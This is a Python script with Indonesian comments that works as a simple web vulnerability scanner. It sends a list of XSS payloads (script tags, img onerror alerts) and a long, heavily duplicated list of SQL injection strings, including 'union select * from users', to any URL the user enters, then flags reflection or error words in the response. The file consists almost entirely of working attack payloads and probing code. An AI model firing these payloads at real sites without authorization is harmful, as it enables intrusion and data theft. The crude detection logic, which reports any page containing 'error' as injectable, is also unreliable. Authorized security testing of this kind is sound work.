import requests
from bs4 import BeautifulSoup

# Mendefinisikan payload umum untuk serangan XSS (Cross-Site Scripting) dan SQL Injection
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>",
    "'><img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>"
]

sql_payloads = [
    "' OR 1=1--",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "' OR '1'='1'-- -",
    "' OR '1'='1'#",
    "\" OR 1=1--",
    "\" OR 1=1-- -",
    "\" OR 1=1#",
    "') OR 1=1--",
    "') OR 1=1-- -",
    "') OR 1=1#",
    "'; OR 1=1--",
    "'; OR 1=1-- -",
    "'; OR 1=1#",
    "admin or 1=1--",
    "admin or 1=1-- -",
    "admin or 1=1#",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x'='x",
    "\")) OR (('x\"=\"x",
    "')) OR ((\"x\"=\"x",
    "' or 1=1--",
    "\" or 1=1--",
    "') or 1=1--",
    "\") or 1=1--",
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "') or ('1'='1",
    "\") or (\"1\"=\"1",
    "' or a=a--",
    "\" or a=a--",
    "') or a=a--",
    "\") or a=a--",
    "' or username like '%",
    "\" or username like '%",
    "') or username like '%",
    "\") or username like '%",
    "' or 'x'='x",
    "\" or \"x\"=\"x",
    "') or ('x'='x",
    "\") or (\"x\"=\"x",
    "' or 1=1--",
    "\" or 1=1--",
    "') or 1=1--",
    "\") or 1=1--",
    "' or a=a--",
    "\" or a=a--",
    "') or a=a--",
    "\") or a=a--",
    "' union select null--",
    "\" union select null--",
    "') union select null--",
    "\") union select null--",
    "' union select * from users--",
    "\" union select * from users--",
    "') union select * from users--",
    "\") union select * from users--",
    "' or 1=1--",
    "\" or 1=1--",
    "') or 1=1--",
    "\") or 1=1--",
    "' or a=a--",
    "\" or a=a--",
    "') or a=a--",
    "\") or a=a--",
    "' union select null--",
    "\" union select null--",
    "') union select null--",
    "\") union select null--",
    "' union select * from users--",
    "\" union select * from users--",
    "') union select * from users--",
    "\") union select * from users--"
]

# Fungsi untuk menguji XSS Vulnerabilities
def test_xss(url):
    print(f"Menguji {url} untuk XSS Vulnerabilities...")
    for payload in xss_payloads:
        # Mengirimkan permintaan dengan payload XSS
        response = requests.get(url, params={'input': payload})
        # Memeriksa apakah payload tercermin dalam respons
        if payload in response.text:
            print(f"Potensi XSS Vulnerabilities terdeteksi dengan payload: {payload}")
            return True
    print("Tidak ada XSS Vulnerabilities yang terdeteksi.")
    return False

# Fungsi untuk menguji SQL Injection Vulnerabilities
def test_sql_injection(url):
    print(f"Menguji {url} untuk SQL Injection Vulnerabilities...")
    for payload in sql_payloads:
        # Mengirimkan permintaan dengan payload SQL
        response = requests.get(url, params={'input': payload})
        # Memeriksa apakah respons menunjukkan SQL injection yang berhasil
        if "error" in response.text or "SQL" in response.text or "syntax" in response.text:
            print(f"Potensi SQL Injection Vulnerabilities terdeteksi dengan payload: {payload}")
            return True
    print("Tidak ada SQL Injection Vulnerabilities yang terdeteksi.")
    return False

# Fungsi utama untuk menguji XSS vulnerabilities dan SQL Injection pada URL tertentu
def test_vulnerabilities(url):
    xss_found = test_xss(url)
    sql_injection_found = test_sql_injection(url)
    
    if xss_found or sql_injection_found:
        print("Vulnerabilities ditemukan.")
    else:
        print("Tidak ada vulnerabilities yang ditemukan.")

# Mendapatkan input URL dari pengguna
if __name__ == "__main__":
    target_url = input("Masukkan URL aplikasi web yang akan diuji: ")
    test_vulnerabilities(target_url)